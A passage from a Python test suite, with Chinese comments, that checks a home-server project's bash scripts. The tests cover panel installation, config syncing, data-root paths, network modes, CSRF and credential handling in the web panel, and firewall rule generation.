        drv_sh.write_text(
            "set -u\n"
            + 'SRC_DIR="' + _pp(PANEL_DIR) + '"\n'
            + 'PANEL_INSTALL_DIR="' + _pp(tgt) + '"\n'
            + "INSTALL_DIR_MODE=1\n"
            + body + "\n"
            + "panel_install_copy\n",
            encoding="utf-8", newline="\n")
        r = run_bash([_pp(drv_sh)], timeout=60)
        ok = (tgt / "app.py").exists() and (tgt / "templates").is_dir() \
            and (tgt / "config.json").exists() and (tgt / "requirements.txt").exists()
        check(r.returncode == 0 and ok,
              "面板迁移: app.py/templates/static/config.json/requirements.txt 均已就位")
        _shutil.rmtree(str(drv), ignore_errors=True)

    init_src = read(PROJECT_ROOT / "init" / "init.sh")
    check("PANEL_INSTALL_DIR=" in init_src and "/opt/onecloud/panel" in init_src,
          "init.sh 定义面板稳定安装目录 (默认 /opt/onecloud/panel)")
    check('ONECLOUD_PANEL_INSTALL_DIR="$PANEL_INSTALL_DIR"' in init_src,
          "init.sh 安装面板时注入安装目录")
    check("panel_sync_config" in init_src and "sync-panel-config.sh" in init_src,
          "init.sh 提供面板配置同步入口")

    # ---------- 3) 节点 IP -> 面板配置同步 ----------
    gpc = SCRIPTS_DIR / "gen-panel-config.sh"
    gsrc = read(gpc)
    check("--out" in gsrc and "ONECLOUD_PANEL_CONFIG" in gsrc,
          "gen-panel-config.sh 支持 --out / ONECLOUD_PANEL_CONFIG")

    tmpd = _P(_tf.mkdtemp(prefix="ocgpc_"))
    outp = tmpd / "pc.json"
    r = run_bash([_pp(gpc), "--out", _pp(outp)])
    nn = 0
    try:
        d = _json.loads(outp.read_text(encoding="utf-8"))
        nn = len(d.get("nodes", []))
        ok = nn >= 1 and bool(d["nodes"][0].get("ip"))
    except Exception:
        ok = False
    check(ok, f"gen-panel-config --out 生成合法 JSON (节点数 {nn})")

    r = run_bash([_pp(gpc), "--out", _pp(outp)], {"ONECLOUD_WK_EDGE_01_IP": "10.77.77.77"})
    try:
        got = _json.loads(outp.read_text(encoding="utf-8"))["nodes"][0]["ip"]
    except Exception:
        got = "?"
    check(got == "10.77.77.77", "gen-panel-config: 清单/环境变量里的节点 IP 被透传")

    syncp = SCRIPTS_DIR / "sync-panel-config.sh"
    if not syncp.exists():
        check(False, "sync-panel-config.sh 存在")
    else:
        check(True, "sync-panel-config.sh 存在")
        r = run_bash(["-n", _pp(syncp)], timeout=60)
        check(r.returncode == 0, "sync-panel-config.sh 语法正确")
        ssrc = read(syncp)
        check("gen-panel-config.sh" in ssrc and "PANEL_CONFIG=" in ssrc,
              "sync-panel-config.sh 复用 gen-panel-config 生成器")
        check("PANEL_REPO_CONFIG" in ssrc, "sync-panel-config.sh 支持重定向仓库副本路径 (可测)")

        fake = _P(_tf.mkdtemp(prefix="ocsync_"))
        instdir = fake / "instpanel"
        instdir.mkdir()
        (instdir / "config.json").write_text('{"old":true}', encoding="utf-8")
        unit = fake / "panel.service"
        unit.write_text("[Service]\nEnvironment=PANEL_CONFIG=" + _pp(instdir)
                        + "/config.json\n", encoding="utf-8", newline="\n")
        repocfg = fake / "repo_config.json"
        env2 = {"ONECLOUD_PANEL_UNIT": _pp(unit),
                "ONECLOUD_PANEL_REPO_CONFIG": _pp(repocfg)}
        r = run_bash([_pp(syncp)], env2)
        txt = (instdir / "config.json").read_text(encoding="utf-8")
        check('"nodes"' in txt and '"old"' not in txt,
              "sync-panel-config: 刷新面板实际读取的 config.json (unit 指定目录)")
        check(repocfg.exists() and '"nodes"' in repocfg.read_text(encoding="utf-8"),
              "sync-panel-config: 仓库副本同步刷新")
        r2 = run_bash([_pp(syncp), "--dry-run"], env2, timeout=60)
        check(r2.returncode == 0 and "dry-run" in (r2.stdout + r2.stderr),
              "sync-panel-config --dry-run: 只提示不写入")
        _shutil.rmtree(str(fake), ignore_errors=True)

    _shutil.rmtree(str(tmpd), ignore_errors=True)

    # bootstrap 回写节点身份
    bsrc = read(SCRIPTS_DIR / "bootstrap.sh")
    check("update_local_inventory()" in bsrc, "bootstrap.sh 定义 update_local_inventory()")
    check("install.conf" in bsrc and "DATA_ROOT=${DATA_ROOT}" in bsrc,
          "bootstrap.sh 记录 /etc/onecloud/install.conf (含 DATA_ROOT)")
    check("已回写节点清单" in bsrc, "bootstrap.sh 结尾回写节点清单 (部署改的 IP 不再丢失)")

    body2 = extract_fn(SCRIPTS_DIR / "bootstrap.sh", "update_local_inventory")
    if not body2:
        check(False, "update_local_inventory 可抽取执行")
    else:
        drv = _P(_tf.mkdtemp(prefix="ocinv_"))
        (drv / "scripts").mkdir()
        (drv / "inventory").mkdir()
        (drv / "inventory" / "nodes.local.yaml").write_text(
            "nodes:\n  - name: wk-edge-01\n    ip: 1.1.1.1\n    hostname: edge-01\n"
            "    wg_ip: 10.8.0.101\n\nnetwork:\n  gateway: 192.168.1.1\n",
            encoding="utf-8", newline="\n")
        drv_sh = drv / "drv.sh"
        drv_sh.write_text(
            "set -u\n"
            + 'SCRIPT_DIR="' + _pp(drv / "scripts") + '"\n'
            + body2 + "\n"
            + "update_local_inventory wk-edge-01 9.9.9.9 edge-01 10.8.0.101\n"
            + "update_local_inventory wk-node-77 9.9.9.77 node-77 10.8.0.77\n",
            encoding="utf-8", newline="\n")
        r = run_bash([_pp(drv_sh)], timeout=60)
        y = (drv / "inventory" / "nodes.local.yaml").read_text(encoding="utf-8")
        check("ip: 9.9.9.9" in y, "update_local_inventory: 就地更新已有节点 IP")
        check("name: wk-node-77" in y and "ip: 9.9.9.77" in y,
              "update_local_inventory: 追加新节点")
        check(y.index("name: wk-node-77") < y.index("network:"),
              "update_local_inventory: 新节点落在 nodes 段内 (network 之前)")
        check(r.returncode == 0, "update_local_inventory 执行返回 0")
        _shutil.rmtree(str(drv), ignore_errors=True)

    # ---------- 4) 同类问题: 远程数据根一致性 ----------
    lnsrc = read(SCRIPTS_DIR / "lib-nodes.sh")
    check("node_data_root()" in lnsrc, "lib-nodes.sh 提供 node_data_root()")

    _lib_path = _pp(SCRIPTS_DIR / "lib-nodes.sh")

    def run_lib(snippet, extra=None):
        drv = _P(_tf.mkdtemp(prefix="oclib_"))
        sh = drv / "d.sh"
        sh.write_text('source "' + _lib_path + '"\n' + snippet,
                      encoding="utf-8", newline="\n")
        out = run_bash([_pp(sh)], extra, timeout=60).stdout.strip()
        _shutil.rmtree(str(drv), ignore_errors=True)
        return out

    a = run_lib("node_data_root 10.123.0.1")
    check(a == "/mnt/sd", "node_data_root: SSH 不可用时回退 /mnt/sd (兼容旧环境)")
    b = run_lib("node_data_root 10.123.0.1", {"ONECLOUD_REMOTE_DATA_ROOT": "/opt/onecloud"})
    check(b == "/opt/onecloud", "node_data_root: ONECLOUD_REMOTE_DATA_ROOT 覆盖生效")

    dep = read(SCRIPTS_DIR / "deploy.sh")
    dep_code = "\n".join(l for l in dep.splitlines() if not l.lstrip().startswith("#"))
    check("node_data_root" in dep and "/mnt/sd" not in dep_code,
          "deploy.sh 代码不再硬编码 /mnt/sd, 改用 node_data_root (含 scripts/docs/inventory)")
    bks = read(SCRIPTS_DIR / "backup.sh")
    check("node_data_root" in bks and "/mnt/sd/srv*" in bks,
          "backup.sh 经 node_data_root 将 /mnt/sd 前缀映射到实际数据根")
    rs = read(SCRIPTS_DIR / "restore.sh")
    check("node_data_root" in rs and "/mnt/sd/srv*" in rs,
          "restore.sh 经 node_data_root 将 /mnt/sd 前缀映射到实际数据根")
    ua = read(SCRIPTS_DIR / "update-all.sh")
    check("node_data_root" in ua and "${REMOTE_ROOT}/srv" in ua,
          "update-all.sh 远程目录改用 REMOTE_ROOT")
    hc = read(SCRIPTS_DIR / "health-check.sh")
    check("node_data_root" in hc and "droot" in hc,
          "health-check.sh 磁盘检查改用节点实际数据根")


# ============================================================
# 测试 33 / 34 / 35: 可选组件与三种组网模式 (v1.6.0)
#
# 这三组共享一套 bash 执行外壳; 抽出 _oc_test_env() / _oc_bash() /
# _oc_read() 放在模块级, 避免在每个测试函数里重复定义 (组 32 当年是内联的,
# 复制第三遍时已经明显重复了)。
# ============================================================

_OC_GIT = "C:/Users/betyk/.workbuddy/binaries/PortableGit/versions/1.2.0"


def _oc_pp(x):
    """Windows 路径 -> msys 路径。
    必须先把反斜杠换成 /, 否则传给 bash 的参数会被反斜杠转义吃掉。"""
    s = str(x).replace("\\", "/")
    m = re.match(r"^([A-Za-z]):/(.*)$", s)
    return f"/{m.group(1).lower()}/{m.group(2)}" if m else s


def _oc_env(extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    """构造干净的子进程环境。
    要点: 去掉宿主注入的 BASH_ENV shim —— 它会在每次非交互 bash 启动时重置
    PATH, 导致子进程里的 awk/sed/grep 等 coreutils 找不到 (环境假失败)。"""
    e = dict(os.environ)
    e.pop("BASH_ENV", None)
    e["PATH"] = f"{_OC_GIT}/usr/bin;{_OC_GIT}/bin;" + e.get("PATH", "")
    if extra:
        e.update({k: str(v) for k, v in extra.items()})
    return e


def _oc_bash(script: str, extra_env=None, timeout: int = 300):
    """在 Git Bash 里跑一段 bash 脚本, 返回 CompletedProcess。

    超时给 300s: 这段 bash 在 Windows 上要反复 fork (子脚本里再嵌套
    `bash -c` 取值), 冷启动进程创建开销是 Linux 的十几倍, 90~120s 会
    出现「脚本本身没问题但被 kill」的假失败。"""
    return subprocess.run(
        [f"{_OC_GIT}/bin/bash.exe", "-c", script],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        cwd=str(PROJECT_ROOT), env=_oc_env(extra_env), timeout=timeout,
    )


def _oc_read(rel: str) -> str:
    return (PROJECT_ROOT / rel).read_text(encoding="utf-8")


def _oc_check(cond, msg: str):
    log_pass(msg) if cond else log_fail(msg)


def test_lib_services():
    """测试 33: lib-services.sh 单一真相库 (安装态 / 组网模式 / 数据根)"""
    print("\n" + "=" * 60)
    print("测试 33: lib-services.sh 单一真相库")
    print("=" * 60)

    libs = SCRIPTS_DIR / "lib-services.sh"
    _oc_check(libs.exists(), "scripts/lib-services.sh 存在")
    if not libs.exists():
        return

    src = _oc_read("scripts/lib-services.sh")

    # ---- 1) 库约定 ----
    _oc_check("_LIB_SERVICES_LOADED" in src, "具备幂等加载守卫 _LIB_SERVICES_LOADED")
    _oc_check(not re.search(r"^\s*set -e", src, re.M),
              "不启用 set -e (由调用方控制)")
    _oc_check(not re.search(r"^log_info\(\)", src, re.M),
              "不重复定义 log_info (避免与调用方冲突)")
    _oc_check(". \"${_LIB_SERVICES_DIR}/lib-nodes.sh\"" in src,
              "只依赖 lib-nodes.sh, 不重复实现清单解析")

    # ---- 2) 关键函数齐全 ----
    for fn in ("network_mode", "wg_enabled", "wg_enabled_on", "node_has_service",
               "services_optional", "services_default_enabled",
               "services_install_mode", "services_provides", "services_port",
               "service_installed", "oc_data_root", "node_data_dir",
               "service_data_dir", "probe_addr_for", "probe_fallback_addr_for",
               "wg_hub_node", "wg_hub_ip", "services_status_table",
               "network_mode_label"):
        _oc_check(f"{fn}()" in src, f"导出函数 {fn}()")

    # ---- 3) installed 语义 + 三态 ----
    _oc_check("应当安装" in src,
              "注释明确 installed = 应当安装 (非探测到进程)")
    _oc_check("未安装" in src and "已安装但停止" in src and "运行中" in src,
              "文档化三态 (未安装 / 已停止 / 运行中)")
    _oc_check("wg_enabled_on" in src and 'if [ "$s" = "wireguard" ]' in src,
          "service_installed 对 wireguard 走 wg_enabled_on 判定")

    # ---- 4) 运行时行为: 四种模式 ----
    probe = r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
source scripts/lib-nodes.sh
source scripts/lib-services.sh
printf 'mode=%s\n' "$(network_mode)"
printf 'wg=%s\n' "$(wg_enabled)"
printf 'hub=%s\n' "$(wg_hub_node 2>/dev/null || echo -)"
printf 'label=%s\n' "$(network_mode_label)"
'''
    for mode, want_wg in (("lan", "0"), ("wireguard", "1"), ("mixed", "1")):
        r = _oc_bash(probe, {"ONECLOUD_NET_MODE": mode,
                             "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
        out = r.stdout
        _oc_check(f"mode={mode}" in out, f"network_mode 在 ONECLOUD_NET_MODE={mode} 时回显 {mode}")
        _oc_check(f"wg={want_wg}" in out,
                  f"wg_enabled 在 {mode} 模式为 {want_wg}")

    # auto 模式: 清单里 wireguard.default_enabled=false -> lan
    r = _oc_bash(probe, {"ONECLOUD_NET_MODE": "auto",
                         "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("mode=lan" in r.stdout and "wg=0" in r.stdout,
              "auto 模式按 wireguard.default_enabled=false 推导为 lan / wg=0")

    # ---- 5) lan 强制关闭 WG (即使清单仍声明 wireguard) ----
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
source scripts/lib-nodes.sh
source scripts/lib-services.sh
printf 'has_svc=%s\n' "$(node_has_service wk-edge-01 wireguard)"
printf 'wg_on_node=%s\n' "$(wg_enabled_on wk-edge-01)"
printf 'installed=%s\n' "$(service_installed wk-edge-01 wireguard)"
''', {"ONECLOUD_NET_MODE": "lan", "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("has_svc=1" in r.stdout,
              "lan 模式清单里仍声明 wireguard (用于验证强制关闭)")
    _oc_check("wg_on_node=0" in r.stdout,
              "lan 模式强制 wg_enabled_on=0")
    _oc_check("installed=0" in r.stdout,
              "lan 模式 service_installed(wireguard)=0")

    # ---- 6) manual 安装方式 -> installed=0 ----
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
source scripts/lib-nodes.sh
source scripts/lib-services.sh
printf 'verysync_installed=%s\n' "$(service_installed wk-storage-03 verysync)"
printf 'verysync_mode=%s\n' "$(services_install_mode verysync)"
printf 'wg_optional=%s\n' "$(services_optional wireguard)"
printf 'wg_default=%s\n' "$(services_default_enabled wireguard)"
printf 'wg_provides=%s\n' "$(services_provides wireguard)"
printf 'nonsvc_optional=%s\n' "$(services_optional syncthing)"
printf 'nonsvc_default=%s\n' "$(services_default_enabled syncthing)"
''', {"ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("verysync_installed=0" in r.stdout,
              "verysync (install: manual) -> installed=0")
    _oc_check("verysync_mode=manual" in r.stdout, "verysync 安装方式解析为 manual")
    _oc_check("wg_optional=1" in r.stdout, "wireguard optional=1")
    _oc_check("wg_default=0" in r.stdout, "wireguard default_enabled=0")
    _oc_check("wg_provides=wg-mesh" in r.stdout, "wireguard provides=wg-mesh")
    _oc_check("nonsvc_optional=0" in r.stdout,
              "未声明 optional 的服务默认 false (必装)")
    _oc_check("nonsvc_default=1" in r.stdout,
              "未声明 default_enabled 的服务默认 true")

    # ---- 7) 端口解析 (含 ports 列表回退) ----
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
source scripts/lib-nodes.sh
source scripts/lib-services.sh
printf 'wg=%s\n'    "$(services_port wireguard)"
printf 'clash=%s\n' "$(services_port clash)"
printf 'gitea=%s\n' "$(services_port gitea)"
printf 'adg=%s\n'   "$(services_port adguard)"
printf 'memos=%s\n' "$(services_port memos)"
''', {"ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("wg=51820" in r.stdout,
              "services_port wireguard=51820 (从 ports 列表首项取宿主端口)")
    _oc_check("clash=9090" in r.stdout, "services_port clash=9090 (标量 port)")
    _oc_check("gitea=3000" in r.stdout,
              "services_port gitea=3000 (列表首项 '3000:3000' 取宿主侧)")
    _oc_check("adg=0" in r.stdout,
              "services_port adguard=0 (host 网络/无 ports, 视为无主端口)")
    _oc_check("memos=0" in r.stdout,
              "services_port memos=0 (端口是 ${VAR} 占位, 无法静态解析)")

    # ---- 8) 数据根拼接: 一律 <DATA_ROOT>/srv/<完整节点名>/<服务> ----
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
export ONECLOUD_REMOTE_DATA_ROOT=/opt/onecloud
source scripts/lib-nodes.sh
source scripts/lib-services.sh
printf 'svc=%s\n'  "$(service_data_dir wk-edge-01 clash)"
printf 'node=%s\n' "$(node_data_dir wk-edge-01)"
printf 'root=%s\n' "$(oc_data_root)"
''', {"ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("/opt/onecloud/srv/wk-edge-01/clash" in r.stdout,
              "service_data_dir 拼接为 <DATA_ROOT>/srv/<完整节点名>/<服务名>")
    _oc_check("/opt/onecloud/srv/wk-edge-01" in r.stdout,
              "node_data_dir 用完整节点名 (wk-edge-01, 非短名 edge-01)")

    # ---- 9) services_status_table: TSV 6 列 / 无空字段 ----
    # 注意: 本环境的 bash 函数调用被 BASH_ENV shim 拖到 ~0.5s/次, 而本函数内部
    # 有 ~110 次函数调用 => 单次就接近 2 分钟。所以这里**只调一次**, 三件事
    # (列数 / 行数 / 空字段) 在同一次输出上断言, 不要再起第二次进程。
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
source scripts/lib-nodes.sh
source scripts/lib-services.sh
services_status_table | awk -F'\t' '
  { rows++
    if (NF != 6) bad++
    for (i = 1; i <= NF; i++) if ($i == "") empty++
  }
  END { printf "rows=%d bad=%d empty=%d\n", rows+0, bad+0, empty+0 }'
''', {"ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)}, timeout=420)
    _oc_check("bad=0" in r.stdout,
              "services_status_table 每行恰好 6 列 (TSV)")
    m = re.search(r"rows=(\d+)", r.stdout)
    _oc_check(m and int(m.group(1)) >= 18,
              f"services_status_table 覆盖全部服务 (实测 {m.group(1) if m else '?'} 行)")
    # 反向断言: 任何一列都不得为空 —— `IFS=$'\t' read` 会折叠空字段,
    # 后面的列左移顶位 (实测把端口号显示进了「安装方式」列)。
    _oc_check("empty=0" in r.stdout,
              "services_status_table 无空字段 (空值以 - 占位, 避免 read 折叠)")

    # ---- 10) 非法模式不静默通过 ----
    r = _oc_bash(probe, {"ONECLOUD_NET_MODE": "bogus",
                         "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)})
    _oc_check("不是合法取值" in (r.stdout + r.stderr),
              "非法 network.mode 打出告警 (不静默接受)")
    _oc_check("mode=lan" in r.stdout,
              "非法 network.mode 回退 auto (无 default_enabled 时为 lan)")


def test_optional_components_chain():
    """测试 34: 可选组件在安装/部署/检查全链路的适配 (7 条反向断言)"""
    print("\n" + "=" * 60)
    print("测试 34: 可选组件全链路适配 (含 7 条反向断言)")
    print("=" * 60)

    # ---------- A. 清单字段 ----------
    svc_src = _oc_read("inventory/services.yaml")
    _oc_check(re.search(r"^  wireguard:", svc_src, re.M) and
              re.search(r"^    optional: true", svc_src, re.M),
              "services.yaml wireguard 声明 optional: true")
    _oc_check(re.search(r"^    default_enabled: false", svc_src, re.M),
              "services.yaml wireguard 声明 default_enabled: false")
    _oc_check(re.search(r"^    provides: wg-mesh", svc_src, re.M),
              "services.yaml wireguard 声明 provides: wg-mesh")
    _oc_check(re.search(r"^  verysync:", svc_src, re.M) and
              re.search(r"^    install: manual", svc_src, re.M),
              "services.yaml verysync 声明 install: manual")

    nodes_src = _oc_read("inventory/nodes.yaml")
    _oc_check(re.search(r"^  mode: \w+", nodes_src, re.M),
              "nodes.yaml network 段含 mode 字段")
    _oc_check("auto" in nodes_src and "wireguard" in nodes_src and
              "lan" in nodes_src and "mixed" in nodes_src,
              "nodes.yaml 文档化 auto|wireguard|lan|mixed 四种取值")
    _oc_check("强制" in nodes_src and "视作未安装" in nodes_src,
              "nodes.yaml 说明 lan 强制关闭 WireGuard")

    # ---------- B. 反向断言 ① 不含字面 /mnt/sd/srv 拼接 ----------
    for rel in ("scripts/install-services.sh", "scripts/deploy.sh",
                "scripts/health-check.sh", "scripts/lib-services.sh"):
        s = _oc_read(rel)
        bad = [ln for ln in s.splitlines()
               if "/mnt/sd/srv" in ln and not ln.strip().startswith("#")]
        _oc_check(not bad, f"{rel} 无未注释的 /mnt/sd/srv 字面拼接")

    # ---------- C. 反向断言 ② 不含 /mnt/sd/<短名> 硬编码 ----------
    short_hard = []
    for pf in sorted(PROJECT_ROOT.glob("node-wk-*/*/*")):
        if not pf.is_file() or pf.suffix not in (".sh", ".json", ".yaml", ".yml"):
            continue
        try:
            txt = pf.read_text(encoding="utf-8")
        except Exception:
            continue
        for ln in txt.splitlines():
            if ln.strip().startswith("#"):
                continue
            # /mnt/sd/edge-01 ... 即"/mnt/sd/"后直接跟短名 (而非 srv/)
            if re.search(r"/mnt/sd/(edge|iot|storage)-", ln):
                short_hard.append(f"{pf.relative_to(PROJECT_ROOT)}: {ln.strip()[:70]}")
    _oc_check(not short_hard,
              f"节点侧无 /mnt/sd/<短名> 硬编码 (检出 {len(short_hard)} 处)")

    # ---------- D. 节点侧数据根改为 __DATA_ROOT__ 占位 ----------
    cfg = _oc_read("node-wk-iot-02/xiaomusic/config.json")
    _oc_check("__DATA_ROOT__" in cfg,
              "xiaomusic config.json 用 __DATA_ROOT__ 占位")
    _oc_check("/mnt/sd/iot-02" not in cfg,
              "xiaomusic config.json 不再写死 /mnt/sd/iot-02")
    try:
        json.loads(cfg)
        _oc_check(True, "xiaomusic config.json 仍是合法 JSON")
    except Exception as e:
        _oc_check(False, f"xiaomusic config.json JSON 合法 ({e})")

    vy = _oc_read("node-wk-storage-03/verysync/config.yaml")
    _oc_check(vy.count("__DATA_ROOT__") >= 4,
              f"verysync config.yaml 全部路径用占位 ({vy.count('__DATA_ROOT__')} 处)")
    _oc_check("/mnt/sd/storage-03" not in vy,
              "verysync config.yaml 不再写死 /mnt/sd/storage-03")

    # 渲染函数确实存在且被调用
    isvc = _oc_read("scripts/install-services.sh")
    _oc_check("render_template()" in isvc, "install-services.sh 定义 render_template()")
    _oc_check("service_template_dir()" in isvc,
              "install-services.sh 定义 service_template_dir()")
    for call in ('render_template "$tpl" "${xm_dir}/config.json"',):
        _oc_check(call in isvc,
                  f"xiaomusic 安装时渲染模板配置 ({call[:40]}...)")
    _oc_check('render_template "$tpl" "${dir}/config.yaml"' in isvc,
              "verysync 手动安装指引里也渲染模板")

    # ---------- E. 反向断言 ③ 每个 fetch( 都要带 credentials ----------
    # 统一走 apiFetch 包装器; 例外: 包装器自身 + /logout (显式带 credentials)
    with open(PANEL_DIR / "static" / "js" / "app.js", encoding="utf-8") as f:
        js_lines = f.read().splitlines()
    bad_fetch = []
    for i, ln in enumerate(js_lines):
        if "fetch(" not in ln or ln.strip().startswith("//"):
            continue
        window = "\n".join(js_lines[max(0, i - 3):i + 6])
        if "credentials" in window or "function apiFetch" in window:
            continue
        bad_fetch.append(f"L{i+1}: {ln.strip()[:60]}")
    _oc_check(not bad_fetch,
              f"app.js 所有 fetch 均带 credentials (或走 apiFetch): 违规 {len(bad_fetch)}")
    _oc_check("X-Requested-With" in "\n".join(js_lines),
              "app.js apiFetch 设置 X-Requested-With (CSRF 头)")

    # ---------- F. 反向断言 ④ require_auth 路由集 == 前端调用集 ----------
    app_src = _oc_read("panel/app.py")

    # 后端: 收集 (route 路径, 其紧跟的装饰器里是否有 require_auth)
    #   装饰器顺序在源码里是 route 在前、require_auth 在后, 但也允许反过来,
    #   所以按"从 @app.route 起向后看 3 行内是否出现 @require_auth"判定。
    app_lines = app_src.splitlines()
    be_routes = set()
    for i, ln in enumerate(app_lines):
        m = re.match(r'\s*@app\.route\("([^"]+)"', ln)
        if not m:
            continue
        path = m.group(1)
        if not path.startswith("/api/"):
            continue
        window = "\n".join(app_lines[i:i + 4])
        if "@require_auth" in window:
            be_routes.add(path)

    # 前端: apiFetch("...") / apiFetch(`...${..}...`) 调用的路径
    #   JS 模板串里是 /api/service/${node}/${svc}/${action},
    #   后端是 /api/service/<node_name>/<svc_name>/<action> —— 归一化动态段后再比。
    js_src = "\n".join(js_lines)
    fe_raw = set(re.findall(r'apiFetch\(\s*[`"\'](/api/[^`"\'?]*)', js_src))

    def _norm(p: str) -> str:
        # 把 ${x} / <x> / :x 统一成 * , 便于跨语言比较
        p = re.sub(r"\$\{[^}]*\}", "*", p)
        p = re.sub(r"<[^>]*>", "*", p)
        p = re.sub(r":[A-Za-z_]\w*", "*", p)
        return p.rstrip("/")

    be_norm = {_norm(p) for p in be_routes}
    fe_missing = sorted(p for p in fe_raw if _norm(p) not in be_norm)
    _oc_check(bool(be_routes),
              f"后端声明了 require_auth 的 /api 路由 ({len(be_routes)} 条: "
              f"{', '.join(sorted(be_routes))})")
    _oc_check(bool(fe_raw),
              f"前端经 apiFetch 调用了 /api 路由 ({len(fe_raw)} 条)")
    _oc_check(not fe_missing,
              f"前端调用的 /api 路由都在受保护集合内 (越权调用 {len(fe_missing)}: {fe_missing})")
    # 每个写操作路由都要带 CSRF 头校验
    write_routes = [p for p in be_routes
                    if re.search(r'@app\.route\("' + re.escape(p) + r'"[^)]*methods=\[[^]]*"POST"',
                                 app_src)]
    missing_csrf = []
    for p in write_routes:
        i = next(i for i, ln in enumerate(app_lines)
                 if f'@app.route("{p}"' in ln)
        if "@require_csrf_header" not in "\n".join(app_lines[i:i + 5]):
            missing_csrf.append(p)
    _oc_check(not missing_csrf,
              f"全部 POST 路由都带 require_csrf_header (缺失 {missing_csrf})")

    # ---------- G. 反向断言 ⑤ container:false 必须有 case 分支或 install:manual ----------
    # 解析 services.yaml 的 container 标志
    conts = dict(re.findall(
        r"^  ([\w-]+):\n(?:^(?:    .*)\n)*?^    container: (\w+)",
        svc_src, re.M))
    manual_svcs = set(re.findall(
        r"^  ([\w-]+):\n(?:^(?:    .*)\n)*?^    install: manual", svc_src, re.M))
    native = {k for k, v in conts.items() if v == "false"}
    isvc_src = isvc
    # 两个例外, 各有独立的安装入口 (不在 install-services.sh 的 case 里):
    #   panel  -> panel/install-service.sh (systemd 单元 + 文件迁移)
    #   clash / xiaomusic -> 本就在 case 分支中
    external_installers = {"panel": "panel/install-service.sh"}
    uncovered = []
    for svc in sorted(native):
        if svc in manual_svcs:
            continue
        if re.search(rf"^\s*{re.escape(svc)}\s*\)", isvc_src, re.M):
            continue
        if f"{svc})" in isvc_src or f'"{svc}"' in isvc_src:
            continue
        owner = external_installers.get(svc)
        if owner and (PROJECT_ROOT / owner).exists():
            continue
        uncovered.append(svc)
    _oc_check(not uncovered,
              f"全部 container:false 服务都有安装分支或标 manual ({uncovered})")
    _oc_check((PROJECT_ROOT / "panel/install-service.sh").exists(),
              "panel 有独立安装脚本 panel/install-service.sh")

    # ---------- H. 反向断言 ⑥ lan 模式防火墙不含 WireGuard 端口 ----------
    fw = SCRIPTS_DIR / "firewall-recommend.sh"
    fw_src = _oc_read("scripts/firewall-recommend.sh")
    _oc_check('WG_ON="$(wg_enabled)"' in fw_src,
              "firewall-recommend.sh 取 wg_enabled 作为 WG 开关")
    _oc_check('if [ "$WG_ON" = "1" ] && [ "$node" = "$HUB_NODE" ]' in fw_src,
              "WG 端口规则被 mode 开关包裹")
    r = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
for _n in $(bash scripts/lib-nodes.sh >/dev/null 2>&1; source scripts/lib-nodes.sh; node_names); do
  bash scripts/firewall-recommend.sh --emit-dsl "$_n"
done
''', {"ONECLOUD_NET_MODE": "lan", "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)}, timeout=420)
    dsl_lan = r.stdout
    _oc_check("51820" not in dsl_lan,
              f"lan 模式全部节点 DSL 不含 51820 ({dsl_lan.count(chr(10))} 行规则)")
    _oc_check("in accept" in dsl_lan,
              "lan 模式仍输出常规放行规则 (非空清单)")
    # verysync 是 manual -> 未安装, 不应出现在规则里
    _oc_check("19900" not in dsl_lan,
              "lan 模式不含 verysync 端口 19900 (manual 未安装)")

    r2 = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
bash scripts/firewall-recommend.sh --emit-dsl
''', {"ONECLOUD_NET_MODE": "mixed", "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)}, timeout=420)
    _oc_check("51820" in r2.stdout,
              "mixed 模式 DSL 含 51820 (WireGuard Hub 入站)")

    # 正文里 WireGuard 章节也要按模式切换
    r3 = _oc_bash(r'''
set -u
cd "$ONECLOUD_PROJECT_ROOT"
export ONECLOUD_SKIP_DATA_ROOT_RESOLVE=1
bash scripts/firewall-recommend.sh --stdout wk-edge-01
''', {"ONECLOUD_NET_MODE": "lan", "ONECLOUD_PROJECT_ROOT": _oc_pp(PROJECT_ROOT)}, timeout=420)
    _oc_check("不需要 WireGuard 相关规则" in r3.stdout,
              "lan 模式清单正文声明无需 WG 规则")
    # 不能只查 "MASQUERADE" 是否出现 —— lan 章节会明确写"不需要 ... MASQUERADE"
    # (否定句), 于是要在正文里找的是**可执行命令块**: "iptables -t nat -A POSTROUTING"。
    _oc_check("iptables -t nat -A POSTROUTING" not in r3.stdout,
              "lan 模式清单不含可执行的 MASQUERADE 命令")
    _oc_check("iptables -C FORWARD -i wg0 -j ACCEPT" not in r3.stdout,
              "lan 模式清单不含可执行的 FORWARD 放行命令")
    # 不能直接查 "51820" 是否出现 —— 本清单会用一句说明文字明确告诉用户
    # "本清单**不含** UDP 51820 放行", 那是必要的提示而非规则。
